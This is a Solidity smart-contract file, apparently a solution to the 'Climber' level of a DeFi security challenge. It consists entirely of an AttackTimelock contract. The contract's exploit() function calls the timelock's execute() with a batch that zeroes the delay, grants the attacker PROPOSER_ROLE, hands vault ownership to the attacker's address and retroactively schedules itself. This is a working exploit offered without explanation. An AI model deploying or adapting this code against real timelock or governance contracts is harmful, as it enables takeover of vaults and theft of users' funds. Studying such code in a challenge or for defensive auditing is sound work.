// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract AttackTimelock {

    address private owner;
    IClimberTimelock private timelock;
    address private vault;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(address _owner, address _timelock, address _vault) {
        owner = _owner;
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
    }

    function exploit() external {

        targets.push(address(timelock));
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
        values.push(uint256(0));

        targets.push(address(timelock));
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
        values.push(uint256(0));

        targets.push(vault);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", owner));
        values.push(uint256(0));
        
        targets.push(address(this));
        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(uint256(0));

        salt = keccak256("salt");
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}